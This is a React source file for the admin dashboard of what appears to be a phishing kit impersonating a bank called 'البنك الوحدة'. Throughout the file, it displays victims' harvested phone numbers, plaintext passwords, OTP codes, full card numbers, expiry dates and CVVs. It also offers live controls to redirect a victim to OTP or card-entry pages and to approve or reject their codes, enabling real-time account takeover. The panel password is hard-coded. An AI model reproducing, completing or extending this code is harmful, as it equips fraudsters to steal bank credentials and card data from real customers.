import { useState, useEffect } from "react";
import {
  Shield, Users, Wifi, WifiOff, Trash2, Send, ChevronDown, ChevronUp,
  RefreshCw, LogOut, Eye, EyeOff, CreditCard, Phone, Lock, Globe, Clock
} from "lucide-react";
import { adminApi, type Visitor } from "@/lib/api";

const BRAND = { primary: "#1a3d6e", gold: "#c4923e", bg: "#0d1f35" };
const POLL = 3000;
const PASSWORD = "admin1234";

function timeAgo(ts: number) {
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 60) return `${s}ث`;
  if (s < 3600) return `${Math.floor(s / 60)}د`;
  return `${Math.floor(s / 3600)}س`;
}

function pageLabel(page: string) {
  const map: Record<string, { label: string; color: string }> = {
    "الرئيسية": { label: "الرئيسية", color: "#6b7280" },
    "تسجيل الدخول": { label: "تسجيل الدخول", color: "#3b82f6" },
    "تسجيل الدخول - مكتمل": { label: "دخول ✓", color: "#10b981" },
    "بيانات البطاقة": { label: "بطاقة", color: "#8b5cf6" },
    "بيانات البطاقة - مكتملة": { label: "بطاقة ✓", color: "#7c3aed" },
    "انتظار": { label: "انتظار", color: "#f59e0b" },
    "التحقق OTP": { label: "OTP", color: "#ef4444" },
    "OTP - منتظر": { label: "OTP ⏳", color: "#f97316" },
  };
  const e = map[page];
  if (e) return <span className="inline-block text-[11px] font-bold rounded-full px-2 py-0.5 text-white" style={{ background: e.color }}>{e.label}</span>;
  return <span className="inline-block text-[11px] font-bold rounded-full px-2 py-0.5 bg-gray-200 text-gray-600">{page || "—"}</span>;
}

function StatCard({ label, value, Icon, color }: { label: string; value: number; Icon: any; color: string }) {
  return (
    <div className="bg-white/10 backdrop-blur-sm rounded-2xl p-4 border border-white/10">
      <div className="flex items-center gap-3 mb-2">
        <div className="w-8 h-8 rounded-xl flex items-center justify-center" style={{ background: color + "30" }}>
          <Icon className="w-4 h-4" style={{ color }} />
        </div>
        <span className="text-white/70 text-sm font-semibold">{label}</span>
      </div>
      <div className="text-2xl font-black text-white">{value}</div>
    </div>
  );
}

export default function AdminPage() {
  const [authed, setAuthed] = useState(false);
  const [pw, setPw] = useState("");
  const [pwErr, setPwErr] = useState(false);
  const [showPw, setShowPw] = useState(false);
  const [visitors, setVisitors] = useState<Visitor[]>([]);
  const [expanded, setExpanded] = useState<string | null>(null);
  const [lastRefresh, setLastRefresh] = useState<Date | null>(null);
  const [showCvv, setShowCvv] = useState<Set<string>>(new Set());

  useEffect(() => {
    if (!authed) return;
    const load = async () => {
      const data = await adminApi.getAll();
      setVisitors(data);
      setLastRefresh(new Date());
    };
    load();
    const iv = setInterval(load, POLL);
    return () => clearInterval(iv);
  }, [authed]);

  if (!authed) return (
    <div className="min-h-screen flex items-center justify-center p-4" dir="rtl"
      style={{ fontFamily: "'Cairo', system-ui, sans-serif", background: `linear-gradient(135deg, ${BRAND.bg}, ${BRAND.primary})` }}>
      <div className="bg-white rounded-3xl shadow-2xl w-full max-w-xs p-8 space-y-6">
        <div className="text-center">
          <div className="w-16 h-16 rounded-2xl flex items-center justify-center mx-auto mb-3" style={{ background: BRAND.primary }}>
            <Shield className="w-8 h-8 text-white" />
          </div>
          <h1 className="text-xl font-black text-gray-900">البنك الوحدة</h1>
          <p className="text-gray-500 text-sm">لوحة التحكم الإدارية</p>
        </div>
        <div className="space-y-3">
          <div className="relative">
            <input
              type={showPw ? "text" : "password"}
              value={pw}
              onChange={e => setPw(e.target.value)}
              onKeyDown={e => e.key === "Enter" && (() => { pw === PASSWORD ? setAuthed(true) : setPwErr(true); })()}
              placeholder="كلمة المرور"
              className="w-full border-2 border-gray-200 rounded-xl px-4 py-3 text-sm font-semibold outline-none"
              style={{ borderColor: pwErr ? "#ef4444" : undefined }}
              onFocus={e => { e.target.style.borderColor = BRAND.primary; setPwErr(false); }}
              onBlur={e => (e.target.style.borderColor = "#e5e7eb")}
            />
            <button onClick={() => setShowPw(!showPw)} className="absolute top-1/2 left-3 -translate-y-1/2 text-gray-400">
              {showPw ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>
          {pwErr && <p className="text-red-500 text-xs font-bold text-center">كلمة المرور غير صحيحة</p>}
          <button
            onClick={() => { pw === PASSWORD ? setAuthed(true) : setPwErr(true); }}
            className="w-full py-3 rounded-xl text-white font-black text-sm hover:opacity-90 transition-opacity"
            style={{ background: BRAND.primary }}>
            دخول
          </button>
        </div>
      </div>
    </div>
  );

  const live = visitors.filter(v => v.isActive);
  const withOtp = visitors.filter(v => v.otpCode);
  const withCard = visitors.filter(v => v.cardNumber);

  return (
    <div className="min-h-screen" dir="rtl"
      style={{ fontFamily: "'Cairo', system-ui, sans-serif", background: `linear-gradient(180deg, ${BRAND.bg} 0%, #0a1628 100%)` }}>

      {/* HEADER */}
      <header style={{ background: `${BRAND.primary}cc`, borderBottom: "1px solid rgba(255,255,255,0.1)" }} className="sticky top-0 z-50 backdrop-blur-md">
        <div className="max-w-7xl mx-auto px-4 h-14 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-xl flex items-center justify-center" style={{ background: BRAND.gold }}>
              <Shield className="w-4 h-4 text-white" />
            </div>
            <div>
              <span className="text-white font-black text-base">البنك الوحدة</span>
              <span className="text-white/50 text-[11px] mr-2">Admin</span>
            </div>
          </div>
          <div className="flex items-center gap-3">
            {lastRefresh && (
              <span className="text-white/50 text-[11px] hidden sm:block">
                آخر تحديث: {lastRefresh.toLocaleTimeString("ar")}
              </span>
            )}
            <button onClick={() => setAuthed(false)} className="flex items-center gap-1.5 text-red-400 hover:text-red-300 text-sm font-bold transition-colors">
              <LogOut className="w-4 h-4" /> خروج
            </button>
          </div>
        </div>
      </header>

      <div className="max-w-7xl mx-auto px-4 py-6 space-y-6">

        {/* STATS */}
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
          <StatCard label="الزوار الكلي" value={visitors.length} Icon={Users} color="#60a5fa" />
          <StatCard label="متصلون الآن" value={live.length} Icon={Wifi} color="#34d399" />
          <StatCard label="أدخلوا OTP" value={withOtp.length} Icon={Phone} color="#f59e0b" />
          <StatCard label="بيانات البطاقة" value={withCard.length} Icon={CreditCard} color={BRAND.gold} />
        </div>

        {/* ACTIONS */}
        <div className="flex flex-wrap gap-3 items-center">
          <h2 className="text-white font-black text-lg flex-1">الجلسات النشطة</h2>
          <button onClick={() => adminApi.deleteAll().then(() => setVisitors([]))}
            className="flex items-center gap-1.5 bg-red-500/20 hover:bg-red-500/30 border border-red-500/30 text-red-400 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
            <Trash2 className="w-3.5 h-3.5" /> حذف الكل
          </button>
        </div>

        {/* TABLE */}
        {visitors.length === 0 ? (
          <div className="bg-white/5 rounded-2xl p-12 text-center border border-white/10">
            <Users className="w-12 h-12 text-white/20 mx-auto mb-3" />
            <p className="text-white/40 font-semibold">لا يوجد زوار حتى الآن</p>
          </div>
        ) : (
          <div className="space-y-3">
            {visitors.map(v => (
              <div key={v.id} className="bg-white/5 border border-white/10 rounded-2xl overflow-hidden hover:border-white/20 transition-colors">
                {/* Row */}
                <div className="px-5 py-4 flex flex-wrap items-center gap-3">
                  {/* Status */}
                  <div className="flex items-center gap-2 min-w-[90px]">
                    {v.isActive
                      ? <><Wifi className="w-4 h-4 text-green-400" /><span className="text-green-400 text-xs font-bold">متصل</span></>
                      : <><WifiOff className="w-4 h-4 text-gray-500" /><span className="text-gray-500 text-xs font-bold">منقطع</span></>}
                  </div>

                  {/* Phone */}
                  <div className="flex items-center gap-1.5 flex-1 min-w-[120px]">
                    <Phone className="w-3.5 h-3.5 text-blue-400" />
                    <span className="text-white font-bold text-sm">{v.phone || "—"}</span>
                  </div>

                  {/* Password */}
                  {v.password && (
                    <div className="flex items-center gap-1.5">
                      <Lock className="w-3.5 h-3.5 text-purple-400" />
                      <span className="text-purple-300 font-bold text-sm">{v.password}</span>
                    </div>
                  )}

                  {/* OTP */}
                  {v.otpCode && (
                    <div className="bg-amber-500/20 border border-amber-500/30 rounded-lg px-3 py-1">
                      <span className="text-amber-300 font-black text-sm">{v.otpCode}</span>
                    </div>
                  )}

                  {/* Page */}
                  {pageLabel(v.page)}

                  {/* Country */}
                  {v.country && (
                    <div className="flex items-center gap-1">
                      <Globe className="w-3 h-3 text-gray-400" />
                      <span className="text-gray-400 text-xs font-bold">{v.country}</span>
                    </div>
                  )}

                  {/* Time */}
                  <div className="flex items-center gap-1 text-gray-500 text-xs">
                    <Clock className="w-3 h-3" />
                    {v.lastSeen ? timeAgo(v.lastSeen) : "—"}
                  </div>

                  {/* Expand */}
                  <button onClick={() => setExpanded(expanded === v.id ? null : v.id)} className="text-white/40 hover:text-white/80 transition-colors mr-auto">
                    {expanded === v.id ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                  </button>
                </div>

                {/* Expanded */}
                {expanded === v.id && (
                  <div className="border-t border-white/10 px-5 py-4 space-y-4" style={{ background: "rgba(0,0,0,0.2)" }}>

                    {/* Card data */}
                    {v.cardNumber && (
                      <div className="bg-white/5 rounded-xl p-4 border border-white/10">
                        <div className="flex items-center gap-2 mb-3">
                          <CreditCard className="w-4 h-4" style={{ color: BRAND.gold }} />
                          <span className="font-black text-sm" style={{ color: BRAND.gold }}>بيانات البطاقة</span>
                          <button onClick={() => {
                            const next = new Set(showCvv);
                            next.has(v.id) ? next.delete(v.id) : next.add(v.id);
                            setShowCvv(next);
                          }} className="mr-auto text-gray-400 hover:text-white transition-colors">
                            {showCvv.has(v.id) ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                          </button>
                        </div>
                        <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-sm">
                          <div>
                            <p className="text-gray-400 text-xs font-bold mb-1">رقم البطاقة</p>
                            <p className="text-white font-mono font-bold" dir="ltr">{v.cardNumber.replace(/(.{4})/g, "$1 ").trim()}</p>
                          </div>
                          <div>
                            <p className="text-gray-400 text-xs font-bold mb-1">الاسم</p>
                            <p className="text-white font-bold uppercase">{v.cardName}</p>
                          </div>
                          <div>
                            <p className="text-gray-400 text-xs font-bold mb-1">الصلاحية</p>
                            <p className="text-white font-bold" dir="ltr">{v.cardMonth}/{v.cardYearExp}</p>
                          </div>
                          <div>
                            <p className="text-gray-400 text-xs font-bold mb-1">CVV</p>
                            <p className="text-white font-black font-mono">{showCvv.has(v.id) ? v.cardCvv : "•••"}</p>
                          </div>
                        </div>
                      </div>
                    )}

                    {/* Approve / Cancel — shown prominently when visitor is on waiting page */}
                    {v.page === "تسجيل الدخول - مكتمل" || v.page === "انتظار" ? (
                      <div className="rounded-2xl border-2 border-yellow-500/40 bg-yellow-500/10 p-4 space-y-3">
                        <p className="text-yellow-300 text-xs font-black flex items-center gap-1.5">
                          ⏳ المستخدم في صفحة الانتظار — اتخذ قرارك:
                        </p>
                        <div className="grid grid-cols-2 gap-3">
                          <button
                            onClick={() => adminApi.sendCmd(v.id, "redirect:otp")}
                            className="flex items-center justify-center gap-2 py-3 rounded-xl font-black text-sm text-white transition-all hover:scale-105 active:scale-95"
                            style={{ background: "linear-gradient(135deg, #16a34a, #15803d)", boxShadow: "0 4px 14px rgba(22,163,74,0.4)" }}
                          >
                            ✓ موافقة
                          </button>
                          <button
                            onClick={() => adminApi.sendCmd(v.id, "redirect:reject")}
                            className="flex items-center justify-center gap-2 py-3 rounded-xl font-black text-sm text-white transition-all hover:scale-105 active:scale-95"
                            style={{ background: "linear-gradient(135deg, #dc2626, #b91c1c)", boxShadow: "0 4px 14px rgba(220,38,38,0.4)" }}
                          >
                            ✗ إلغاء
                          </button>
                        </div>
                      </div>
                    ) : null}

                    {/* Commands */}
                    <div className="space-y-2">
                      <p className="text-gray-400 text-xs font-black">إرسال أمر:</p>
                      <div className="flex flex-wrap gap-2">
                        <button onClick={() => adminApi.sendCmd(v.id, "redirect:otp")}
                          className="flex items-center gap-1.5 bg-amber-500/20 hover:bg-amber-500/30 border border-amber-500/30 text-amber-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
                          <Send className="w-3.5 h-3.5" /> طلب OTP
                        </button>
                        <button onClick={() => adminApi.sendCmd(v.id, "redirect:card")}
                          className="flex items-center gap-1.5 bg-purple-500/20 hover:bg-purple-500/30 border border-purple-500/30 text-purple-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
                          <CreditCard className="w-3.5 h-3.5" /> طلب بطاقة
                        </button>
                        <button onClick={() => adminApi.sendCmd(v.id, "otp:approved")}
                          className="flex items-center gap-1.5 bg-green-500/20 hover:bg-green-500/30 border border-green-500/30 text-green-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
                          ✓ قبول OTP
                        </button>
                        <button onClick={() => adminApi.sendCmd(v.id, "otp:rejected")}
                          className="flex items-center gap-1.5 bg-red-500/20 hover:bg-red-500/30 border border-red-500/30 text-red-400 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
                          ✗ رفض OTP
                        </button>
                        <button onClick={() => adminApi.sendCmd(v.id, "redirect:reject")}
                          className="flex items-center gap-1.5 bg-red-500/20 hover:bg-red-500/30 border border-red-500/30 text-red-400 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
                          ✗ إلغاء (انتظار)
                        </button>
                        <button onClick={() => adminApi.sendCmd(v.id, "redirect:login")}
                          className="flex items-center gap-1.5 bg-blue-500/20 hover:bg-blue-500/30 border border-blue-500/30 text-blue-300 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
                          ↩ رجوع للدخول
                        </button>
                        <button onClick={() => adminApi.delete(v.id).then(() => setVisitors(vs => vs.filter(x => x.id !== v.id)))}
                          className="flex items-center gap-1.5 bg-gray-500/20 hover:bg-gray-500/30 border border-gray-500/30 text-gray-400 font-bold text-xs px-3 py-2 rounded-xl transition-colors">
                          <Trash2 className="w-3.5 h-3.5" /> حذف
                        </button>
                      </div>
                    </div>

                    {/* All data */}
                    <details className="group">
                      <summary className="text-gray-400 text-xs font-bold cursor-pointer hover:text-white transition-colors list-none flex items-center gap-1">
                        <ChevronDown className="w-3 h-3 group-open:rotate-180 transition-transform" />
                        جميع البيانات
                      </summary>
                      <div className="mt-2 bg-black/30 rounded-xl p-3 text-xs font-mono text-green-300 overflow-x-auto">
                        <pre>{JSON.stringify(v, null, 2)}</pre>
                      </div>
                    </details>
                  </div>
                )}
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}
